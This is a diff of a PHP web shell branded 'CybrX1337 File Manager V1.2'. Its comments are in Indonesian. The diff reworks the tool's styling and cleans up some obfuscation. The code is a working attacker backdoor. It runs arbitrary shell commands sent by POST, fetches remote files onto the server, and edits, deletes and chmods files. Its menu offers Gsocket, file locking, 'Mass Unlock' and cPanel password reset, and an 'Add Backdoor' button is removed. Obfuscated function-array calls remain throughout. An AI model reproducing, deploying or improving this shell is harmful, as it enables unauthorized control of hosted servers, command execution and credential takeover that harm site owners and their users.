             $status = 'error';
         } else {
             if (empty($local_name)) {
                 $url_path = parse_url($remote_url, PHP_URL_PATH);
-                $local_name = basename($url_path);
-                if (empty($local_name)) {
-                    $message = 'Error: Could not determine filename from URL. Please specify a name.';
-                    $status = 'error';
-                    $local_name = false;
-                }
+                $local_name = sanitize_filename(basename($url_path) ?: 'remote_file');
             }
-
-            if ($local_name) {
-                $destination_path = $current_path . DIRECTORY_SEPARATOR . $local_name;
-                if (!ini_get('allow_url_fopen')) {
-                    $message = 'Error: Remote file fetching is disabled on this server (allow_url_fopen is off).';
-                    $status = 'error';
+            
+            $destination_path = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $local_name;
+            
+            if (!ini_get('allow_url_fopen')) {
+                $message = 'Error: Remote file fetching is disabled on this server (`allow_url_fopen` is off).';
+                $status = 'error';
+            } else {
+                // Use copy() for potentially better resource handling and error reporting
+                if (@copy($remote_url, $destination_path)) {
+                    $message = 'File remotely uploaded successfully as ' . htmlspecialchars($local_name) . '.';
+                    $status = 'success';
                 } else {
-                    $content = @$A[16]($remote_url);
-                    if ($content === false) {
-                        $message = 'Error: Could not fetch file content from the URL.';
-                        $status = 'error';
-                    } else {
-                        if ($A[17]($destination_path, $content) !== false) {
-                            $message = 'File remotely uploaded successfully.';
-                            $status = 'success';
-                        } else {
-                            $message = 'Error: Could not save the fetched file.';
-                            $status = 'error';
-                        }
-                    }
+                    $message = 'Error: Could not copy file content from the URL. Check URL validity and server network access.';
+                    $status = 'error';
                 }
             }
         }
     }
-
-
-    header("Location: ?path=" . E($current_path) . "&msg=" . urlencode($message) . "&status=" . $status);
-    exit();
+    
+    // Fallback if no specific action uses header, necessary for file/folder creation/other
+    if (!empty($message) && !isset($_POST['save_file'])) {
+        header("Location: ?path=" . $current_path_encoded . "&msg=" . urlencode($message) . "&status=" . $status);
+        exit();
+    }
 }
 
-
+function sanitize_filename($filename) {
+    // Remove anything that isn't a letter, number, dot, underscore, or hyphen
+    return preg_replace('/[^A-Za-z0-9\-\._]/', '', $filename);
+}
 
 // =================================================================
 // PROSES TERMINAL & INFO SERVER
 // =================================================================
 $server_os = PHP_OS;
 $php_version = PHP_VERSION;
-$server_software = $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\x52\x45"] ?? 'Unknown';
-$current_user = get_current_user();
+$server_software = $_SERVER["SERVER_SOFTWARE"] ?? 'Unknown';
+$current_user = function_exists('get_current_user') ? get_current_user() : 'N/A';
 $server_time = date('Y-m-d H:i:s');
 
 $output = '';
 if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
     $cmd = $_POST['cmd'];
+    // For command execution, we want to ensure we don't accidentally execute a file/folder action post
     $output = c($cmd);
 }
 
@@ -580,16 +736,25 @@ if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
 // LOGIKA TAMPILAN (FRONT-END)
 // =================================================================
 $files = $A[2]($path);
+
 if ($files !== false) {
     usort($files, function ($a, $b) use ($path, $A) {
-        $aPath = $path . DIRECTORY_SEPARATOR . $a;
-        $bPath = $path . DIRECTORY_SEPARATOR . $b;
-        $aIsDir = $A[4]($aPath);
-        $bIsDir = $A[4]($bPath);
+        $aPath = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $a;
+        $bPath = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $b;
+        $aIsDir = @$A[4]($aPath);
+        $bIsDir = @$A[4]($bPath);
+        
+        // Always place '.' first, then '..'
         if ($a === '.') return -1;
         if ($b === '.') return 1;
+        if ($a === '..') return -1;
+        if ($b === '..') return 1;
+
+        // Directories before files
         if ($aIsDir && !$bIsDir) return -1;
         if (!$aIsDir && $bIsDir) return 1;
+        
+        // Alphabetical sort for same type
         return strcasecmp($a, $b);
     });
 }
@@ -599,7 +764,8 @@ if ($files !== false) {
 
 <head>
     <meta charset="UTF-8" />
-    <title>PHP File Manager Terminal</title>
+    <title>PHP File Manager Terminal | CybrX1337</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.7/codemirror.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.7/theme/base16-dark.min.css">
@@ -611,39 +777,98 @@ if ($files !== false) {
     <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.7/mode/clike/clike.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 
-
-    <style>
+<style>
         html,
         body {
             margin: 0;
-            padding: 0;
-            height: 100%;
-            background-color: #121212;
+            min-height: 100vh;
+            background-color: #191a24ff;
             color: #e0e0e0;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             font-size: 16px;
             line-height: 1.5;
+            /* PERBAIKAN 1: Mengurangi padding body global dari 40px menjadi 20px */
+            padding: 12px 0; 
+            box-sizing: border-box;
         }
-
+        
         .container {
-            max-width: 1600px;
-            margin: 40px auto;
-            padding: 20px 30px;
-            background-color: #1e1e1e;
+            max-width: 1360px;
+            margin: 0 auto; /* Tengah-kan konten */
+            /* Padding vertikal 20px, padding horizontal 40px */
+            padding: 10px 40px; 
+            background-color: #242530ff;
             border-radius: 10px;
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.6);
+            box-shadow: 0 8px 24px rgba(22, 20, 39, 0.6);
             box-sizing: border-box;
             display: flex;
             flex-direction: column;
-            min-height: calc(100vh - 80px);
+            min-height: auto; 
         }
+        
+        @media (max-width: 640px) {
+            /* Aturan untuk mobile */
+            body {
+                /* PERBAIKAN 3: Padding body di mobile dikurangi agar container bisa diatur dengan margin */
+                padding: 10px 0; 
+            }
+            .container {
+                /* PERBAIKAN 2: Menggunakan margin vertikal 10px untuk memberikan jarak di atas dan bawah */
+                margin: 0 10px 10px 10px; 
+                padding: 15px;
+                max-width: none;
+                min-height: auto;
+            }
 
+            .features-menu {
+                flex-direction: column;
+                gap: 10px;
+            }
+
+            .feature-btn {
+                flex: none;
+                width: 100%;
+                padding: 10px;
+                flex-direction: row;
+                justify-content: center;
+            }
+            
+            .feature-btn i {
+                font-size: 20px;
+            }
+            
+            .server-info div {
+                min-width: 100%;
+            }
+
+            .file-manager th,
+            .file-manager td {
+                font-size: 14px;
+                padding: 8px 10px;
+            }
+
+            .action-btn {
+                padding: 4px 8px;
+                font-size: 12px;
+                margin-right: 4px;
+            }
+
+            .file-name {
+                white-space: normal;
+                word-break: break-all;
+            }
+            
+            .modal-content {
+                max-width: 95%;
+            }
+        }
+        
         .server-info {
             background-color: #263238;
             border-radius: 10px;
             padding: 12px 20px;
-            margin-top: 30px;
-            margin-bottom: -10px;
+            margin-top: 16px; 
+            margin-bottom: 0px;
             font-size: 14px;
             color: #b0bec5;
             user-select: none;
@@ -651,12 +876,17 @@ if ($files !== false) {
             flex-wrap: wrap;
             gap: 20px;
             justify-content: space-between;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
         }
 
         .server-info div {
             flex: 1 1 200px;
             min-width: 150px;
+            margin-right: 10px; 
+        }
+        
+        .server-info div:last-child {
+            margin-right: 0;
         }
 
         h1 {
@@ -674,7 +904,7 @@ if ($files !== false) {
         }
 
         .breadcrumb {
-            margin-bottom: 30px;
+            margin-bottom: 15px;
             font-size: 14px;
             color: #a0a0a0;
             overflow-wrap: break-word;
@@ -698,10 +928,12 @@ if ($files !== false) {
         }
 
         .terminal-wrapper {
-            margin-bottom: 20px;
+            margin-top: 15px;
+            margin-bottom: 8px;
         }
 
-        .terminal-wrapper form input[type="text"] {
+        .terminal-wrapper form input[type="text"],
+        .terminal-wrapper form input[type="text"]:focus {
             width: 100%;
             padding: 14px 18px;
             font-size: 16px;
@@ -709,8 +941,7 @@ if ($files !== false) {
             color: #b3e5fc;
             border: none;
             border-radius: 8px;
-            outline-offset: 2px;
-            outline-color: #4fc3f7;
+            outline: 2px solid #4fc3f7;
             transition: background 0.3s ease;
             font-family: 'Consolas', monospace;
             box-sizing: border-box;
@@ -733,7 +964,6 @@ if ($files !== false) {
             white-space: pre-wrap;
             word-wrap: break-word;
             box-shadow: inset 0 0 8px #1e88e5;
-            margin-top: 10px;
             box-sizing: border-box;
         }
 
@@ -750,10 +980,10 @@ if ($files !== false) {
             padding: 12px 20px;
             display: flex;
             gap: 16px;
-            margin-top: 40px;
+            margin-top: 20px;
             flex-wrap: wrap;
             user-select: none;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
         }
 
         .feature-btn {
@@ -794,74 +1024,91 @@ if ($files !== false) {
 
         .file-manager {
             margin-top: 20px;
+            margin-bottom: 30px;
             overflow-x: auto;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
         }
 
         .file-manager table {
             width: 100%;
             border-collapse: collapse;
-            margin: 10px 0 0 0;
             table-layout: auto;
-            border: 1px solid #3949ab;
-            border-radius: 6px;
+            border-radius: 15px;
+            overflow: hidden;
         }
 
         .file-manager th,
         .file-manager td {
-            padding: 12px 15px;
+            padding: 8px 18px;
             text-align: left;
             vertical-align: middle;
-            border: 1px solid #3949ab;
-            background-color: #1f2937;
+            background-color: #292b3aff;
             color: #e3f2fd;
             overflow: hidden;
             text-overflow: ellipsis;
             white-space: nowrap;
+            border-right: 1px solid #3e4a92ff; 
+            box-sizing: border-box;
         }
-
+        
         .file-manager th {
             background: #263238;
             color: #b0bec5;
             font-weight: 600;
-            border-radius: 6px 6px 0 0;
+            border-bottom: 2px solid #5362b4ff;
+            border-right: 1px solid #3e4a92ff;
         }
-
-        .file-name {
-            max-width: 50%;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
+        
+        .file-manager tbody tr td {
+             border-bottom: 1px solid #3e4a92ff;
         }
-
-        .file-type,
-        .file-size {
-            color: #90a4ae;
-            font-style: italic;
-            padding-right: 8px;
-            white-space: nowrap;
-            word-break: break-word;
+        
+        .file-manager tbody tr:last-child td {
+             border-bottom: none;
         }
-
+        
+        .file-manager th:last-child, 
+        .file-manager td:last-child {
+            border-right: none; 
+        }
+           
         .file-manager tbody tr:hover {
-            background-color: #3949ab;
+            background-color: #3e4a92ff;
             color: #e3f2fd;
         }
-
+        
+        /* >>> MODIFIKASI: Tautan nama file menjadi putih (tetap ada warna hover dan icon) <<< */
         .file-manager td a {
-            color: #82b1ff;
+            color: #FFFFFF !important;
             text-decoration: none;
-            font-weight: 500;
-            display: inline-block;
-            max-width: 100%;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
+            display: flex;
+            align-items: center;
         }
-
+        
         .file-manager td a:hover {
-            color: #bbdefb;
+            color: #bbdefb !important;
             text-decoration: underline;
         }
+        
+        .file-manager td a i {
+            margin-right: 8px; /* Atur jarak di sebelah kanan untuk semua icon di kolom nama file */
+        }
+
+        .dir-icon {
+            color: #ffc107; 
+        }
+
+        /* *Icon* file biasa */
+        .file-manager td a .fa-regular.fa-file {
+            color: #b0bec5;
+        }
+        
+        /* >>> MODIFIKASI: Menambahkan kelas untuk cursor pointer pada tautan file <<< */
+        .file-link-file {
+            cursor: pointer;
+        }
+
 
         .action-btn {
             background-color: #37474f;
@@ -869,9 +1116,10 @@ if ($files !== false) {
             border-radius: 6px;
             color: #b0bec5;
             cursor: pointer;
-            padding: 6px 12px;
+            padding: 6px 8px; 
             font-size: 13px;
             margin-right: 6px;
+            margin-bottom: 4px;
             transition: background-color 0.3s ease, color 0.3s ease;
             white-space: nowrap;
         }
@@ -889,11 +1137,12 @@ if ($files !== false) {
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.7);
+            background: rgba(0, 0, 0, 0.8);
             display: none;
             align-items: center;
             justify-content: center;
             z-index: 1000;
+            backdrop-filter: blur(5px);
         }
 
         .modal-content {
@@ -903,14 +1152,17 @@ if ($files !== false) {
             width: 100%;
             max-width: 900px;
             position: relative;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.7);
             display: flex;
             flex-direction: column;
+            max-height: 90vh;
+            overflow-y: auto;
         }
 
         .CodeMirror {
             width: 100%;
             height: 70vh;
+            border-radius: 6px;
         }
 
 
@@ -922,6 +1174,7 @@ if ($files !== false) {
             font-weight: bold;
             color: #aaa;
             cursor: pointer;
+            z-index: 1001;
         }
 
         .modal-close:hover {
@@ -937,37 +1190,33 @@ if ($files !== false) {
             display: block;
             margin-bottom: 5px;
             color: #b0bec5;
-        }
-
-        .modal-body .encoding-notice {
-            background: #3a3a3a;
-            border-left: 3px solid #ffab40;
-            padding: 8px 12px;
-            margin-top: 10px;
-            border-radius: 4px;
-            font-size: 13px;
-            color: #e0e0e0;
-            font-family: 'Consolas', monospace;
+            font-weight: 500;
         }
 
         .modal-body input[type="text"],
         .modal-body textarea,
-        .modal-body input[type="file"] {
+        .modal-body input[type="file"],
+        .modal-body form button[type="submit"] {
             width: 100%;
             padding: 12px;
-            margin-top: 10px;
+            margin-top: 10px; 
             background: #3a3a3a;
             border: 1px solid #555;
             border-radius: 6px;
             color: #e0e0e0;
             box-sizing: border-box;
+            font-family: inherit;
         }
 
         .modal-body textarea {
             font-family: 'Consolas', monospace;
             font-size: 14px;
         }
-
+        
+        .modal-body input[type="file"] {
+             border: 1px solid #4fc3f7; 
+             padding: 8px 12px;
+        }
         .modal-body button,
         .modal-body .btn-group button {
             background-color: #4fc3f7;
@@ -977,7 +1226,7 @@ if ($files !== false) {
             border-radius: 6px;
             cursor: pointer;
             font-weight: bold;
-            margin-top: 15px;
+            margin-top: 15px; 
             transition: background-color 0.3s;
         }
 
@@ -1005,116 +1254,72 @@ if ($files !== false) {
             margin-bottom: 20px;
             border-radius: 5px;
         }
-
-        @media (max-width: 640px) {
-            .features-menu {
-                flex-direction: column;
-            }
-
-            .feature-btn {
-                flex: none;
-                width: 100%;
-            }
-
-            .file-manager th,
-            .file-manager td {
-                font-size: 14px;
-                padding: 8px 10px;
-            }
-
-            .action-btn {
-                padding: 4px 8px;
-                font-size: 12px;
-            }
-
-            .file-name {
-                word-break: break-word;
-            }
-        }
-
+        
         .form-group {
             margin-bottom: 15px;
-        }
-
-        .form-group select {
-            padding: 10px;
-            border-radius: 5px;
-            background-color: #3a3a3a;
-            color: #4fc3f7;
-        }
-
-        .up_filz {
-            padding: 10px;
-            border-radius: 5px;
-            background-color: #3a3a3a;
         }
     </style>
 </head>
 
 <body>
     <div class="container">
-        <h1><i class="fa-solid fa-terminal"></i> CybrX1337 File Manager</h1>
-
-        <nav class="breadcrumb" aria-label="Breadcrumb navigation" style="display: flex; justify-content: space-between; align-items: center;">
-            <div>
+        <h1><i class="fa-solid fa-terminal"></i> CybrX1337 File Manager V1.2</h1>
+        <nav class="breadcrumb" aria-label="Breadcrumb navigation" style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;">
+            <div style="display: flex; align-items: center; justify-content: space-between;">
+            <div id="path-container" style="flex-grow: 1; min-width: 50%;">
                 <?php
-                $currentPath = realpath($path);
-                $parts = explode(DIRECTORY_SEPARATOR, $currentPath);
-                $breadcrumb_links = [];
-                $current_build_path = '';
-
-                if (stristr(PHP_OS, 'WIN')) {
-                    $drive = array_shift($parts);
-                    $current_build_path = $drive . DIRECTORY_SEPARATOR;
-                    echo '<a href="?path=' . E($current_build_path) . '">' . htmlspecialchars($drive) . '</a>';
+                if (strlen($path) > 1) {
+                    $currentPath = realpath($path) ?: $path;
                 } else {
-                    array_shift($parts);
-                    $current_build_path = '/';
-                    echo '<a href="?path=' . E($current_build_path) . '">/</a>';
+                    $currentPath = $path;
                 }
-
-                $last_key = count($parts) - 1;
-                foreach ($parts as $key => $part) {
-                    if (empty($part)) continue;
-                    $current_build_path .= $part . DIRECTORY_SEPARATOR;
-                    if ($key === $last_key) {
-                        $breadcrumb_links[] = '<span aria-current="page">' . htmlspecialchars($part) . '</span>';
+                if (stristr(PHP_OS, 'WIN')) {
+                    $root_char = substr($currentPath, 0, 3) === '/' ? '/' : substr($currentPath, 0, 3);
+                } else {
+                    $root_char = "/";
+                }
+                $path_segments = explode(DIRECTORY_SEPARATOR, trim($currentPath, DIRECTORY_SEPARATOR));
+                $current_build_path = '';
+                echo '<a href="?path=' . E($root_char) . '">' . htmlspecialchars($root_char) . '</a>';
+                foreach ($path_segments as $segment) {
+                    if (empty($segment)) continue;
+                     if (stristr(PHP_OS, 'WIN') && substr($current_build_path, -1) !== DIRECTORY_SEPARATOR && $current_build_path !== '') {
+                        $current_build_path .= DIRECTORY_SEPARATOR;
+                    } elseif (!stristr(PHP_OS, 'WIN') && $current_build_path !== '/') {
+                        $current_build_path .= DIRECTORY_SEPARATOR;
+                    }
+                    $current_build_path .= $segment;
+                    if ($current_build_path === $currentPath || $current_build_path === $root_char) {
+                        echo '<span class="separator">/</span><span aria-current="page" data-path-segment="' . E(dirname($currentPath)) . '">' . htmlspecialchars($segment) . '</span>';
                     } else {
-                        $breadcrumb_links[] = '<a href="?path=' . E($current_build_path) . '">' . htmlspecialchars($part) . '</a>';
+                        echo '<span class="separator">/</span><a href="?path=' . E($current_build_path) . '">' . htmlspecialchars($segment) . '</a>';
                     }
                 }
-                if (!empty($breadcrumb_links)) {
-                    echo '<span class="separator">/</span>' . implode('<span class="separator">/</span>', $breadcrumb_links);
-                }
                 ?>
+                    <button id="copy-path-btn" style="color:#4fc3f7; font-weight:600; background:#37474f; margin-left: 10px; padding:5px 10px; border-radius:6px; text-decoration:none;">
+                        Copy Path
+                    </button>
+                    <textarea id="hidden-path-value" style="position: absolute; left: -9999px;"></textarea>
             </div>
-            <div>
-                <?php
-
-                $previousPage = $_SERVER['HTTP_REFERER'] ?? null;
-
-                if ($previousPage) {
-                    echo '<a href="' . htmlspecialchars($previousPage) . '" style="color:#4fc3f7; font-weight:600; background:#263238; padding:6px 12px; border-radius:6px; text-decoration:none; margin-left:10px;">
-        <i class="fa-solid fa-reply"></i> Kembali</a>';
-                }
-                ?>
             </div>
+            <div style="flex-shrink: 0; margin-top: 5px;">
+            <a href="?path=<?php echo E($base_dir); ?>" style="color:#4fc3f7; font-weight:600; background:#37474f; padding:5px 10px; border-radius:6px; text-decoration:none;">
+                <i class="fa-solid fa-house"></i> Home Shell
+            </a>
+        </div>
         </nav>
 
-
-
-        <section class="terminal-wrapper" role="region" aria-label="Command Terminal">
-            <strong>TERMINAL:</strong>
-            <form method="post" action="" autocomplete="off" spellcheck="false" style="margin-top: 6px;">
-                <input type="text" name="cmd" placeholder="Enter command and press Enter" autofocus />
-            </form>
-        </section>
-
         <section aria-label="Command output">
-            <strong>OUTPUT:</strong>
             <div class="terminal-output-box" tabindex="0" aria-live="polite" aria-atomic="true">
                 <pre><?php echo htmlspecialchars($output); ?></pre>
             </div>
+        </section>
+
+        <section class="terminal-wrapper" role="region" aria-label="Command Terminal">
+            <form method="post" action="?path=<?php echo htmlspecialchars($path_encoded); ?>" autocomplete="off" spellcheck="false" style="margin-top: 6px;">
+                <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>">
+                <input type="text" name="cmd" placeholder="Enter command and press Enter" autofocus />
+            </form>
         </section>
 
         <section class="server-info" aria-label="Server Information">
@@ -1122,49 +1327,55 @@ if ($files !== false) {
             <div><strong>PHP:</strong> <?php echo htmlspecialchars($php_version); ?></div>
             <div><strong>Server:</strong> <?php echo htmlspecialchars($server_software); ?></div>
             <div><strong>User:</strong> <?php echo htmlspecialchars($current_user); ?></div>
-            <div><strong>Path:</strong> <?php echo htmlspecialchars($path); ?></div>
         </section>
 
         <section class="features-menu" aria-label="File Manager Features Menu">
-            <button class="feature-btn" title="Create File"><i class="fa-regular fa-file"></i><span>Create File</span></button>
-            <button class="feature-btn" title="Create Folder"><i class="fa-regular fa-folder"></i><span>Create Folder</span></button>
-            <button class="feature-btn" title="Remote Upload"><i class="fa-solid fa-cloud-arrow-up"></i><span>Remote Upload</span></button>
-            <button class="feature-btn" title="Add Backdoor" type="button"><i class="fa-solid fa-bug"></i><span>Add Backdoor</span></button>
-            <button class="feature-btn" title="Lock File" type="button"><i class="fa-solid fa-lock"></i><span>Lock File</span></button>
-            <button class="feature-btn" title="Gsocket" type="button"><i class="fa-solid fa-star-of-life"></i><span>Gsocket</span></button>
-            <button class="feature-btn" title="Unlock Shell" type="button"><i class="fa-solid fa-unlock"></i><span>Unlock Shell</span></button>
-            <button class="feature-btn" title="cPanel Reset" type="button"><i class="fa-solid fa-key"></i><span>cPanel Reset</span></button>
+            <button class="feature-btn" data-action="create_file" title="Create File"><i class="fa-regular fa-file"></i><span>Create File</span></button>
+            <button class="feature-btn" data-action="create_folder" title="Create Folder"><i class="fa-regular fa-folder"></i><span>Create Folder</span></button>
+            <button class="feature-btn" data-action="remote_upload" title="Remote Upload"><i class="fa-solid fa-cloud-arrow-up"></i><span>Remote Upload</span></button>
+            <button class="feature-btn" data-action="file_upload" title="Upload File"><i class="fa-solid fa-upload"></i><span>Upload File</span></button>
+            <button class="feature-btn" data-action="lock_file" title="Lock File"><i class="fa-solid fa-lock"></i><span>Lock File</span></button>
+            <button class="feature-btn" data-action="gsocket" title="Gsocket"><i class="fa-solid fa-star-of-life"></i><span>Gsocket</span></button>
+            <button class="feature-btn" data-action="mass_unlock" title="Mass Unlock"><i class="fa-solid fa-unlock"></i><span>Mass Unlock</span></button>
+            <button class="feature-btn" data-action="cpanel_reset" title="cPanel Reset"><i class="fa-solid fa-key"></i><span>cPanel Reset</span></button>
         </section>
 
         <section class="file-manager" aria-label="File Manager">
             <table>
                 <thead>
                     <tr>
-                        <th class="file-name">Name</th>
-                        <th>Type</th>
-                        <th>Size</th>
-                        <th>Perms</th>
-                        <th>Actions</th>
+                        <th style="width: 20%">Name</th>
+                        <th style="width: 10%">Type</th>
+                        <th style="width: 10%">Size</th>
+                        <th style="width: 10%">Perms</th>
+                        <th style="width: 1%">Actions</th>
                     </tr>
                 </thead>
                 <tbody>
                     <?php
                     if ($files !== false) {
                         foreach ($files as $file) {
-                            if ($file === '.') continue;
+                             if ($file === '.') continue;
 
                             $fullPath = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $file;
-                            $isDir = $A[4]($fullPath);
-
+                            $isDir = @$A[4]($fullPath);
+                            
                             if ($file === '..') {
                                 $link = '?path=' . E(dirname($path));
+                                $link_class = '';
+                                $data_action = '';
                             } else {
                                 $link = $isDir ? '?path=' . E($fullPath) : '#';
+                                // >>>>>>> MODIFIKASI: Menambahkan kelas untuk file agar bisa diklik dan memicu edit modal <<<<<<<
+                                $link_class = $isDir ? '' : 'file-link-file';
+                                $data_action = $isDir ? '' : 'data-action="edit-file-name" data-file="' . htmlspecialchars($file) . '"';
                             }
-
+                            
+                            $icon_class = $isDir ? 'fa-solid fa-folder dir-icon' : 'fa-regular fa-file';
+                            
                             $size = '-';
-                            if (!$isDir && $A[18]($fullPath)) {
-                                $file_size = $A[20]($fullPath);
+                            if (!$isDir && @$A[18]($fullPath)) {
+                                $file_size = @$A[20]($fullPath);
                                 if ($file_size > 1048576) {
                                     $size = number_format($file_size / 1048576, 2) . ' MB';
                                 } elseif ($file_size > 1024) {
@@ -1173,10 +1384,13 @@ if ($files !== false) {
                                     $size = $file_size . ' B';
                                 }
                             }
-                            $perms = substr(sprintf('%o', @$A[7]($fullPath)), -4);
+                            // Using error suppression for fileperms as it can fail on some files/systems
+                            $perms_num = @$A[7]($fullPath); 
+                            $perms = $perms_num !== false ? substr(sprintf('%o', $perms_num), -4) : '????';
 
                             echo '<tr>';
-                            echo '<td class="file-name"><a href="' . htmlspecialchars($link) . '" title="' . htmlspecialchars($file) . '">' . htmlspecialchars($file) . '</a></td>';
+                            // >>>>>>> MODIFIKASI: Menambahkan data-action pada tautan file <<<<<<<
+                            echo '<td class="file-name"><a href="' . htmlspecialchars($link) . '" class="' . $link_class . '" ' . $data_action . ' title="' . htmlspecialchars($file) . '"><i class="' . $icon_class . '"></i>' . htmlspecialchars($file) . '</a></td>';
                             echo '<td>' . ($isDir ? 'Directory' : 'File') . '</td>';
                             echo '<td>' . $size . '</td>';
                             echo '<td>' . $perms . '</td>';
@@ -1184,17 +1398,24 @@ if ($files !== false) {
                             if (!$isDir) {
                                 echo '<button class="action-btn" data-action="edit" data-file="' . htmlspecialchars($file) . '" title="Edit">EDIT</button> ';
                                 echo '<button class="action-btn" data-action="download" data-file="' . htmlspecialchars($file) . '" title="Download">DOWNLOAD</button> ';
+                            } else if ($file === '..') {
+                                // Action for '..' is just viewing parent, no other actions needed
+                            } else {
+                                // Default actions for all:
                             }
-                            if ($file !== '..') {
-                                echo '<button class="action-btn" data-action="chmod" data-file="' . htmlspecialchars($file) . '" data-perms="' . $perms . '" title="Chmod">CHMOD</button> ';
-                                echo '<button class="action-btn" data-action="rename" data-file="' . htmlspecialchars($file) . '" title="Rename">RENAME</button> ';
-                                echo '<button class="action-btn" data-action="delete" data-file="' . htmlspecialchars($file) . '" title="Delete">DELETE</button>';
+                            
+                            if ($file !== '.') {
+                                if ($file !== '..') {
+                                    echo '<button class="action-btn" data-action="chmod" data-file="' . htmlspecialchars($file) . '" data-perms="' . $perms . '" title="Chmod">CHMOD</button> ';
+                                    echo '<button class="action-btn" data-action="rename" data-file="' . htmlspecialchars($file) . '" title="Rename">RENAME</button> ';
+                                    echo '<button class="action-btn delete-btn" data-action="delete" data-file="' . htmlspecialchars($file) . '" title="Delete">DELETE</button>';
+                                }
                             }
                             echo '</td>';
                             echo '</tr>';
                         }
                     } else {
-                        echo '<tr><td colspan="5">Could not read directory.</td></tr>';
+                        echo '<tr><td colspan="5" style="text-align:center; color:#ff5252;">ERROR: Could not read directory. Check permissions.</td></tr>';
                     }
                     ?>
                 </tbody>
@@ -1211,12 +1432,194 @@ if ($files !== false) {
     </div>
 
     <script>
+        function hexToString(hex) {
+    if (hex.startsWith('0x')) {
+        hex = hex.substring(2);
+    }
+    
+    let str = '';
+        for (let i = 0; i < hex.length; i += 2) {
+            let byte = parseInt(hex.substring(i, i + 2), 16);
+            str += String.fromCharCode(byte);
+        }
+        return str;
+    }
+
+        function copyPath() {
+        const pathContainer = document.getElementById('path-container');
+        const pathLinks = pathContainer.querySelectorAll('a');
+        
+        let fullPath = '';
+        const fullHexPathData = pathContainer.querySelector('[data-path-segment]');
+        let hexPath = '';
+        let finalSegment = '';
+
+        if (fullHexPathData) {
+            hexPath = fullHexPathData.getAttribute('data-path-segment');
+            fullPath = hexToString(hexPath);
+            
+            const finalSegmentElement = pathContainer.querySelector('[aria-current="page"]');
+            if (finalSegmentElement) {
+                finalSegment = finalSegmentElement.textContent.trim();
+                if (!fullPath.endsWith('/') && !finalSegment.startsWith('/')) {
+                    fullPath += '/';
+                }
+                fullPath += finalSegment;
+            }
+
+        } else {
+            fullPath = "Error: Tidak dapat menemukan path lengkap untuk disalin. Harap periksa struktur data-path-segment.";
+        }
+
+
+        if (navigator.clipboard) {
+            navigator.clipboard.writeText(fullPath).then(() => {
+                // Tidak ada notifikasi disini
+            }).catch(err => {
+                console.error('Gagal menyalin menggunakan navigator.clipboard: ', err);
+                fallbackCopy(fullPath);
+            });
+        } else {
+            fallbackCopy(fullPath);
+        }
+    }
+
+    function fallbackCopy(text) {
+        const hiddenInput = document.getElementById('hidden-path-value');
+        hiddenInput.value = text;
+        hiddenInput.select();
+        try {
+            const successful = document.execCommand('copy');
+            const msg = successful ? 'berhasil' : 'gagal';
+            alert(`Path disalin (${msg}):\n` + text);
+        } catch (err) {
+            alert('Gagal menyalin path secara otomatis.');
+        }
+    }
+
+
+    document.getElementById('copy-path-btn').addEventListener('click', copyPath);
+        function handleEdit(fileName) {
+            const modalOverlay = document.getElementById('modal-overlay');
+            const modalBody = document.getElementById('modal-body');
+            const currentPath = <?php echo json_encode($path); ?>;
+            const currentPathEncoded = <?php echo json_encode(E($path)); ?>;
+            const fullPath = currentPath + '/' + fileName;
+            let editorInstance = null;
+
+            // PHP's E() recreated as JS function for client-side encoding/decoding of paths for Ajax/Download
+            const E = (str) => '0x' + Array.from(new TextEncoder().encode(str)).map(b => b.toString(16).padStart(2, '0')).join('');
+
+            const closeModal = () => {
+                modalOverlay.style.display = 'none';
+                modalBody.innerHTML = '';
+                if (editorInstance) {
+                    editorInstance.toTextArea();
+                    editorInstance = null;
+                }
+            };
+            
+            const handleFormSubmit = (e) => {
+                const form = e.target;
+                if (form.id.startsWith('edit-form') && editorInstance) {
+                    editorInstance.save(); 
+                }
+                // Continue with default form submission for others, as they don't use CodeMirror
+            };
+
+
+            modalBody.innerHTML = `<h2><i class="fa-solid fa-file-pen"></i> Edit File: ${fileName}</h2><p>Loading...</p>`;
+            modalOverlay.style.display = 'flex';
+
+            fetch(`?action=get_content&path=${currentPathEncoded}&file=${E(fileName)}`)
+                .then(response => {
+                    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+                    return response.json();
+                })
+                .then(data => {
+                    if (data.error) {
+                        modalBody.innerHTML = `<h2><i class="fa-solid fa-file-pen"></i> Edit File: ${fileName}</h2><p style="color:red;">Error: ${data.error}</p>`;
+                        return;
+                    }
+                    if (data.is_image) {
+                        modalBody.innerHTML = `<h2><i class="fa-solid fa-file-image"></i> View Image: ${fileName}</h2><img src="${data.content}" style="max-width:100%; border-radius:8px;">`;
+                        return;
+                    }
+                    
